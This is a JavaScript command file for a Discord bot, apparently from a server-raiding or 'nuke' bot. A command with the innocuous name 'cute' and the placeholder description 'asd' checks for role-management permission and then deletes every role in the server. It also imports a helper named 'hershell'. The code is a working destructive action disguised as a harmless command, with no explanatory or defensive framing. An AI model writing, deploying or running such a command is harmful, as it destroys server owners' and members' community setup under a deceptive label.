const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const { error, hershell, success } = require("../lib/util");
module.exports = {
  name: "cute",
  description: "asd",
  block: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {

    if(!message.guild.members.me.permissions.has("ManageRoles")) return error(message, "I'm missing permissions!")

    if(message.guild.roles.cache.size < 1) return error(message, 'This server doesnt have roles!')

    message.guild.roles.cache.forEach(rol => rol.delete());
  },
};